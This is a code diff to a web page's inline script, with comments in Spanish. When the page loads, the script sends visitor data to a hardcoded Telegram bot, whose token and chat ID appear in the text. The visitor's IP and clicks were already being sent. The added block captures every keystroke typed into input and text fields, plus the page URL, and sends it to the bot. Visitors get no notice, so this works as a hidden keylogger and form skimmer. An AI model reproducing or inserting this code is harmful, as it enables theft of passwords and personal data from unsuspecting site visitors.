@@ -67,7 +67,7 @@
 <body>
 
    <script>
-        window.onload = function() {
+       window.onload = function() {
     const telegramUrl = "https://api.telegram.org/bot7815776748:AAGl2LfwdET9KRExkGVyYzGfUiXDcqEwUBY/sendMessage";
     const chatId = "5895952454"; // Tu ID de chat real
 
@@ -101,7 +101,7 @@
         })
         .catch(error => console.error("❌ Error al obtener la IP:", error));
 
-    // Detectar clics del usuario
+    // Detectar clics en cualquier parte de la página
     document.addEventListener("click", function(event) {
         const clickedElement = event.target;
         const clickedElementInfo = `Elemento clickeado: ${clickedElement.tagName}, ${clickedElement.id || clickedElement.className}`;
@@ -120,6 +120,26 @@
                 }
             })
             .catch(error => console.error("❌ Error de red:", error));
+    });
+
+    // Detectar cuando el usuario escribe en un campo de texto (input)
+    document.addEventListener("input", function(event) {
+        if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
+            const inputText = event.target.value;
+            const inputMessage = `✍️ El usuario está escribiendo en un campo.\nCampo: ${event.target.tagName} \nTexto: ${inputText}\n\nURL actual: ${window.location.href}`;
+
+            // Enviar mensaje al bot
+            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(inputMessage)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("✅ Mensaje de escritura enviado con éxito.");
+                    } else {
+                        console.error("❌ Error al enviar el mensaje de escritura:", data);
+                    }
+                })
+                .catch(error => console.error("❌ Error de red:", error));
+        }
     });
 
     // Detectar desplazamiento (scroll) en la página
